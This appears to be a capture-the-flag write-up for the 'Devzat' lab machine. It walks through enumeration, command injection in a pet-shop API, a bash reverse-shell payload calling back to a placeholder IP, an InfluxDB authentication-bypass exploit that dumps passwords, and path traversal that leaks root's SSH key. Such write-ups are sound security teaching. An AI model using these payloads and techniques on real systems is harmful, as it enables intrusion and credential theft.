# Devzat

First as usual, `nmap`

```
# Nmap 7.92 scan initiated Tue Oct 26 13:01:51 2021 as: nmap -vvv -p 22,80,8000 -sCV -oA init 10.10.11.118
Nmap scan report for 10.10.11.118
Host is up, received syn-ack (0.069s latency).
Scanned at 2021-10-26 13:01:59 +07 for -80s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNaY36GNxswLsvQjgdNt0oBgiJp/OExsv55LjY72WFW03eiJrOY5hbm5AjjyePPTm2N9HO7uK230THXoGWOXhrlzT3nU/g/DkQyDcFZioiE7M2eRIK2m4egM5SYGcKvXDtQqSK86ex4I31Nq6m9EVpVWphbLfvaWjRmIgOlURo+P76WgjzZzKws42mag2zIrn5oP+ODhOW/3ta289/EMYS6phUbBd0KJIWm9ciNfKA2D7kklnuUP1ZRBe2DbSvd2HV5spoLQKmtY37JEX7aYdETjDUHvTqgkWsVCZAa5qNswPEV7zFlAJTgtW8tZsjW86Q0H49M5dUPra4BEXfZ0/idJy+jpMkbfj6+VjlsvaxxvNUEVrbPBXe9SlbeXdrNla5nenpbwtWNhckUlsEZjlpv8VnHqXt99s1mfHJkgO+yF09gvVPVdglDSqMAla8d2rfaVD68RfoGQc10Af6xiohSOA8LIa0f4Yaw+PjLlcylF5APDnSjtQvHm8TnQyRaVM=
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCenH4vaESizD5ZgkV+1Yo3MJH9MfmUdKhvU+2Z2ShSSWjp1AfRmK/U/rYaFOoeKFIjo1P4s8fz3eXr3Pzk/X80=
|   256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKTxLGFW04ssWG0kheQptJmR5sHKtPI2G+zh4FVF0pBm
80/tcp   open  http    syn-ack Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://devzat.htb/
8000/tcp open  ssh     syn-ack (protocol 2.0)
| ssh-hostkey:
|   3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTPm8Ze7iuUlabZ99t6SWJTw3spK5GP21qE/f7FOT/P+crNvZQKLuSHughKWgZH7Tku7Nmu/WxhZwVUFDpkiDG1mSPeK6uyGpuTmncComFvD3CaldFrZCNxbQ/BbWeyNVpF9szeVTwfdgY5PNoQFQ0reSwtenV6atEA5WfrZzhSZXWuWEn+7HB9C6w1aaqikPQDQSxRArcLZY5cgjNy34ZMk7MLaWciK99/xEYuNEAbR1v0/8ItVv5pyD8QMFD+s2NwHk6eJ3hqks2F5VJeqIZL2gXvBmgvQJ8fBLb0pBN6xa1xkOAPpQkrBL0pEEqKFQsdJaIzDpCBGmEL0E/DfO6Dsyq+dmcFstxwfvNO84OmoD2UArb/PxZPaOowjE47GRHl68cDIi3ULKjKoMg2QD7zrayfc7KXP8qEO0j5Xws0nXMll6VO9Gun6k9yaXkEvrFjfLucqIErd7eLtRvDFwcfw0VdflSdmfEz/NkV8kFpXm7iopTKdcwNcqjNnS1TIs=
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-Go
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.92%I=7%D=10/26%Time=617799DD%P=x86_64-pc-linux-gnu%r(N
SF:ULL,C,"SSH-2\.0-Go\r\n");
Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 26 13:00:39 2021 -- 1 IP address (1 host up) scanned in -71.79 seconds
```

Besides the 2 SSH instances, we have a web server in port 80. We see that going to `http://10.10.11.118` redirects us to `http://devzat.htb/` so we add the domain `devzat.htb` to our `/etc/hosts` and fuzz for virtual hosting while enumerating.

```sh
$ ffuf -u "http://devzat.htb/" -H "Host: FUZZ.devzat.htb" -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fw 18
pets                    [Status: 200, Size: 510, Words: 20, Lines: 21, Duration: 49ms]
```

Looking around the website `http://devzat.htb/`, we see the email `patrick@devzat.htb` which we can try as a username. We're also told to try to SSH in.

```sh
ssh -l [username] devzat.htb -p 8000
```

However, we can't SSH in, as even trying the username "patrick" gives us an error.

```sh
$ ssh -l patrick devzat.htb -p 8000
Unable to negotiate with 10.10.11.118 port 8000: no matching host key type found. Their offer: ssh-rsa
```

Going back to the VHOST fuzzing, we see that we have `pets.devzat.htb` which we add to our `/etc/hosts`. Trying `index.html` and `index.php`, we see that the site `devzat.htb` accepts `index.html`, while `pets.devzat.htb` takes anything and returns the same page, so we fuzz for directories and files on `devzat.htb` with the `html` extension while we enumerate.

```sh
$ gobuster dir -u "http://devzat.htb/" -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html
/assets               (Status: 301) [Size: 309] [--> http://devzat.htb/assets/]
/index.html           (Status: 200) [Size: 6527]
/images               (Status: 301) [Size: 309] [--> http://devzat.htb/images/]
/javascript           (Status: 301) [Size: 313] [--> http://devzat.htb/javascript/]
/generic.html         (Status: 200) [Size: 4851]
/elements.html        (Status: 200) [Size: 18850]
/server-status        (Status: 403) [Size: 275]
```

Looking at the page `http://pets.devzat.htb/`, we see that we can add pets, even though the pets we add are gone when we refresh the page. Looking at the requests in Burp, we see that 2 parameters are provided: `name` and `species`. I tried injecting special characters in `name` on the page but got nothing special. The parameter `species`, however, is set with a list of allowed entries on the page, making it a client-side white-list, meaning the parameter might not be checked securely on the server side, so I target `species`. I tried some SSTI (Server-side Template Injection) with `{{7*7}}` and `{{7*'7'}}` on both `name` and `species` which didn't work.

I found that sending an "add pet" request without the `species` puts "exit status 1" in the "Characteristics" column of the added pet. I then went on to test special characters in `species` and found that `'` (single quote) puts "exit status 2" in the "Characteristics" column instead of "exit status 1" so we have another error. Also, `%22` (URL-encoded double quote) gives "exit status 1". I then fuzzed special characters with the following python script.

```python
#!/usr/bin/python3

import string
import json
import requests

url = "http://pets.devzat.htb/api/pet"

def test(line):
    data = {"name": "test", "species": line}
    requests.post(url, data=json.dumps(data))
    data = requests.get(url).text
    return json.loads(data)[-1]["characteristics"]

badchars = []
for c in string.printable:
    result = test(c)
    if result == "exit status 2":
        badchars.append(c)

print(badchars)
```

That gives us the following bad characters with result in "exit status 2":

- `"`
- `'`
- `(`
- `)`
- `<`
- `>`
- `` ` ``
- `|`

However, I couldn't get anything from that. I then went back to fuzzing files and directories. Even though `pets.devzat.htb` returns the same page for random pages, we might still have some pages we can hit.

```sh
$ ffuf -u http://pets.devzat.htb/FUZZ -w ~/tools/SecLists/Discovery/Web-Content/raft-large-words.txt -fs 510
css                     [Status: 301, Size: 40, Words: 3, Lines: 3, Duration: 68ms]
build                   [Status: 301, Size: 42, Words: 3, Lines: 3, Duration: 49ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 42ms]
.git                    [Status: 301, Size: 41, Words: 3, Lines: 3, Duration: 45ms]
```

We see that we have `.git`. We can dump it with [gitdumper](https://github.com/internetwache/GitTools/tree/master/Dumper).

```sh
gittools-gitdumper http://pets.devzat.htb/.git/ git;
```

Looking at the code, we see command execution in a function.

```go
func loadCharacter(species string) string {
    cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
    stdoutStderr, err := cmd.CombinedOutput()
    if err != nil {
        return err.Error()
    }
    return string(stdoutStderr)
}
```

We can inject code with the `species` parameter. I had been working with the following script ...

```python
#!/usr/bin/python3

import cmd
import json
import requests
import urllib.parse

url = "http://pets.devzat.htb/api/pet"

class Test(cmd.Cmd):
    prompt = ">>> "

    def default(self, line):
        data = {"name": "test", "species": line}
        print(requests.post(url, data=json.dumps(data)).text)
        data = requests.get(url).text
        print(json.dumps(json.loads(data)[-1]["characteristics"], indent=2))

test = Test()
test.cmdloop()
```

... so I tried injecting `id`.

```sh
>>> ; id
Pet was added successfully
"cat: characteristics/: Is a directory\nuid=1000(patrick) gid=1000(patrick) groups=1000(patrick)\n"
```

That worked so I just used the script to inject a reverse shell with the payload `; bash -c 'exec bash -i &>/dev/tcp/YOUR_IP/1337 <&1'` and got a reverse shell as patrick. I then grabbed patrick's SSH and got an SSH shell (using SSH on port 22).

Looking at listening ports ...

```sh
patrick@devzat:~$ ss -tlnp
State     Recv-Q    Send-Q        Local Address:Port         Peer Address:Port    Process
LISTEN    0         4096              127.0.0.1:8443              0.0.0.0:*
LISTEN    0         4096              127.0.0.1:5000              0.0.0.0:*        users:(("petshop",pid=888,fd=3))
LISTEN    0         4096          127.0.0.53%lo:53                0.0.0.0:*
LISTEN    0         4096              127.0.0.1:8086              0.0.0.0:*
LISTEN    0         128                 0.0.0.0:22                0.0.0.0:*
LISTEN    0         4096                      *:8000                    *:*        users:(("devchat",pid=885,fd=7))
LISTEN    0         511                       *:80                      *:*
LISTEN    0         128                    [::]:22                   [::]:*
```

We have services listing on some previously unknown ports, namely 8443, 5000, 53, and 8086. Looking at patrick's home, we have the directory `devzat` which has what looks like a web server. Looking at `devchat.go`, we see that this runs on port 8000, which we found in the `nmap` scan to be an SSH service. Looking around at the code, we do seem to have SSH in this server. Running `grep -R pass`, I found a few conversations in `devchat.go`.

```go
    if strings.ToLower(u.name) == "patrick" {
                u.writeln("admin", "Hey patrick, you there?")
                u.writeln("patrick", "Sure, shoot boss!")
                u.writeln("admin", "So I setup the influxdb for you as we discussed earlier in business meeting.")
                u.writeln("patrick", "Cool :thumbs_up:")
                u.writeln("admin", "Be sure to check it out and see if it works for you, will ya?")
                u.writeln("patrick", "Yes, sure. Am on it!")
                u.writeln("devbot", "admin has left the chat")
        } else if strings.ToLower(u.name) == "admin" {
                u.writeln("admin", "Hey patrick, you there?")
                u.writeln("patrick", "Sure, shoot boss!")
                u.writeln("admin", "So I setup the influxdb for you as we discussed earlier in business meeting.")
                u.writeln("patrick", "Cool :thumbs_up:")
                u.writeln("admin", "Be sure to check it out and see if it works for you, will ya?")
                u.writeln("patrick", "Yes, sure. Am on it!")
        } else if strings.ToLower(u.name) == "catherine" {
                u.writeln("patrick", "Hey Catherine, glad you came.")
                u.writeln("catherine", "Hey bud, what are you up to?")
                u.writeln("patrick", "Remember the cool new feature we talked about the other day?")
                u.writeln("catherine", "Sure")
                u.writeln("patrick", "I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.")
                u.writeln("catherine", "Kinda busy right now :necktie:")
                u.writeln("patrick", "That's perfectly fine :thumbs_up: You'll need a password I gave you last time.")
                u.writeln("catherine", "k")
                u.writeln("patrick", "I left the source for your review in backups.")
                u.writeln("catherine", "Fine. As soon as the boss let me off the leash I will check it out.")
                u.writeln("patrick", "Cool. I am very curious what you think of it. See ya!")
                u.writeln("devbot", "patrick has left the chat")
        } else {
```

The conversations mention influxdb, whose default port is 8086 which was previously found with `ss`, as well as a service on port 8443 whose code should be available to catherine in some backups and there should be a password somewhere catherine can read for that service. I used SSH to forward ports 5000, 8086, and 8443 to their respective same ports on my local machine, and found that port 5000 is just the server for `pets.devzat.htb`, port 8086 gives a 404 not found, and port 8443 seems to be an SSH server written in Go (banner). Since we have the source code for the SSH server on port 8000, I decided to look into the error "ssh no matching host key type found. Their offer: ssh-rsa" and found [this post](https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss) telling us to add `-oHostKeyAlgorithms=+ssh-rsa` to the `ssh` command which I did and got a shell to the application.

```sh
ssh -l patrick -oHostKeyAlgorithms=+ssh-rsa devzat.htb -p 8000
```

I tried looking around in the source code but found nothing useful. We still have 1 more SSH server running on port 8443 so I tried logging into that.

```sh
$ ssh -l patrick localhost -p 8443
admin: Hey patrick, you there?
patrick: Sure, shoot boss!
admin: So I setup the influxdb 1.7.5 for you as we discussed earlier in business meeting.
patrick: Cool 👍
admin: Be sure to check it out and see if it works for you, will ya?
patrick: Yes, sure. Am on it!
devbot: admin has left the chat
Welcome to the chat. There are no more users
devbot: patrick has joined the chat
```

We see that we have influxdb version 1.7.5, with the specific version written out. Looking up "influxdb 1.7.5 vulnerability", we get [CVE-2019-20933](https://vuldb.com/?id.165149), an authentication bug. Looking up the CVE on github, I found [this exploit](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933). I ran it on the port-forwarded influxdb to get the username "admin" and enumerate the databases, specifically the `devzat` database.

```sh
[devzat] Insert query (exit to change db): show measurements
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "name"
                    ],
                    "name": "measurements",
                    "values": [
                        [
                            "user"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}

[devzat] Insert query (exit to change db): select * from "user"
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "name": "user",
                    "values": [
                        [
                            "2021-06-22T20:04:16.313965493Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-22T20:04:16.320782034Z",
                            true,
                            "woBeeYareedahc7Oogeephies7Aiseci",
                            "catherine"
                        ],
                        [
                            "2021-06-22T20:04:16.996682002Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

Of the dumped credentials, only catherine has an account on the machine so we `su` into her account with the found password.

From a previously found conversations between catherine and patrick, we know that we have backups to view. Looking at `/var/backups` ...

```sh
catherine@devzat:/var/backups$ ll
total 140
drwxr-xr-x  2 root      root       4096 Sep 29 16:25 ./
drwxr-xr-x 14 root      root       4096 Jun 22 18:34 ../
-rw-r--r--  1 root      root      59142 Sep 28 18:45 apt.extended_states.0
-rw-r--r--  1 root      root       6588 Sep 21 20:17 apt.extended_states.1.gz
-rw-r--r--  1 root      root       6602 Jul 16 06:41 apt.extended_states.2.gz
-rw-------  1 catherine catherine 28297 Jul 16 07:00 devzat-dev.zip
-rw-------  1 catherine catherine 27567 Jul 16 07:00 devzat-main.zip
```

We see a couple of ZIP files for devzat, which we can copy to `/tmp` and extract. The extracted directories `dev` and `main` can then be `diff`'d.

```diff
< 	// Check my secure password
< 	if pass != "CeilingCatStillAThingIn2021?" {
< 		u.system("You did provide the wrong password")
< 		return
< 	}
```

We see that there's a hard-coded password somewhere in `dev/commands.go`. Going into `dev/`, `devchat.go` shows that this service is running on port 8443. Checking the code, we see that the password is in the function `fileCommand` which can be called in the application as follows.

```sh
/file file_to_read password
```

So I SSH into the server on port 8443 ...

```sh
ssh -l test localhost -p 8443
```

... and call `fileCommand`.

```sh
test: /file /root/root.txt CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/devzat/root/root.txt does not exist!
test: /file ../.ssh/id_rsa CeilingCatStillAThingIn2021?
[SYSTEM] -----BEGIN OPENSSH PRIVATE KEY-----
[SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
[SYSTEM] QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1
[SYSTEM] HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA
[SYSTEM] AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s
[SYSTEM] Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg==
[SYSTEM] -----END OPENSSH PRIVATE KEY-----
```

With root's SSH key, we SSH in as root on the machine.
